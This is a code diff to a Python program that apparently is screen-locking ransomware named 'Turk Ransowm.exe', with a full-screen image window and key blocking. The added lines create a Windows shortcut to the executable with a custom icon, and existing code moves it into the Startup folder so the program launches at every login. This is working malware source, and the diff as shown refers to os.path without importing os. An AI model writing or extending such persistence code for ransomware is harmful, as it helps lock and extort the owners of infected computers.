@@ -4,6 +4,8 @@ from qrcode import QRCode,constants
 from keyboard import block_key
 from shutil import move
 from os import path,makedirs
+import winshell
+from win32com.client import Dispatch
 class Window(CTk):
     def __init__(self):
         super().__init__()
@@ -23,6 +25,9 @@ class Window(CTk):
         self.background_image = Image.open("Turk.jpg")
         self.bg_image = CTkImage(self.background_image, size=(1920, 1080))
         self.bg_label = CTkLabel(self, image=self.bg_image, text="")
+        target = os.path.join(os.getcwd(),"Turk Ransowm.exe")
+        shortcut = "lol.lnk"
+        icon = os.path.join(os.getcwd(),"MT.ico")
         source_file = "lol.lnk"
         destination_dir = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
         makedirs(destination_dir, exist_ok=True)
@@ -31,6 +36,7 @@ class Window(CTk):
             if path.isfile(file_path):
                 pass
             else:
+                self.create_shortcut(target, shortcut, icon)
                 move(source_file, destination_dir)
         except Exception as e:
             pass
@@ -63,6 +69,14 @@ class Window(CTk):
     def secret_key(self,event):
         self.destroy()
         quit()
+    def create_shortcut(self,target_path, shortcut_path, icon_path=None):
+        shell = Dispatch('WScript.Shell')
+        shortcut = shell.CreateShortcut(shortcut_path)
+        shortcut.TargetPath = target_path
+        shortcut.WorkingDirectory = os.path.dirname(target_path)
+        if icon_path:
+            shortcut.IconLocation = icon_path
+        shortcut.save()
 
 
 if __name__ == "__main__":
